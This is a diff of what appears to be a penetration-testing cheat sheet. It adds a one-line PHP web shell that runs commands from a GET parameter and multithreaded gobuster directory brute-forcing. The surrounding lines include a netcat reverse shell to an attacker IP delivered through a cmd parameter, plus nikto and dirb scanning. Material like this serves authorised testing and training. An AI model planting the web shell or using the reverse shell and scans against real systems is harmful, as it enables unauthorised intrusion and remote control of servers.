@@ -51,6 +51,9 @@ https://target IP/level/x/exec/-/show
 
 http://target IP/test.php?cmd=whoami
 http://target IP/test.php?cmd=nc -e /bin/sh <attacker IP> 443
+
+- PHP command injection from a GET request
+<?php echo system($_GET["cmd"]);?>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Cookie Security Issues - missing HttpOnly or Secure attribute
@@ -259,7 +262,8 @@ whatweb https://target.com
 
 - Directory bruteforce
 dirb https://target.com -r -z 10
-gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php
 
 - Configuration
 nikto -h https://target.com -port 443 -Format htm --output target.htm
